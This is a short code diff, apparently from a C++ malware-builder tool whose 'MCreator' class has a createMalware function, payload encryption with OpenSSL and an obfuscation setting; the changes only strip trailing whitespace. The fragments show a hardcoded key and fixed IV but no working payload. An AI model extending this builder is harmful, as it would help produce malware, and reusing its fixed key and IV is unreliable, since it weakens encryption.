@@ -8,9 +8,9 @@
 #include <openssl/evp.h>
 #include <openssl/rand.h>
 
-std::string MCreator::encryptionKey = "defaultkey123456"; 
-std::string MCreator::obfuscationPattern = "~"; 
-int MCreator::logLevel = 1; 
+std::string MCreator::encryptionKey = "defaultkey123456";
+std::string MCreator::obfuscationPattern = "~";
+int MCreator::logLevel = 1;
 std::string MCreator::notificationEndpoint = "";
 
 std::string MCreator::createMalware(const std::string &payloadPath, const std::string &extension) {
@@ -89,7 +89,7 @@ std::string MCreator::readPayloadFromFile(const std::string &filePath) {
 }
 
 std::string MCreator::encryptPayload(const std::string &payload) {
-    std::string key = encryptionKey; 
+    std::string key = encryptionKey;
     std::string iv = "exampleiv1234567";
 
     std::string encryptedPayload;
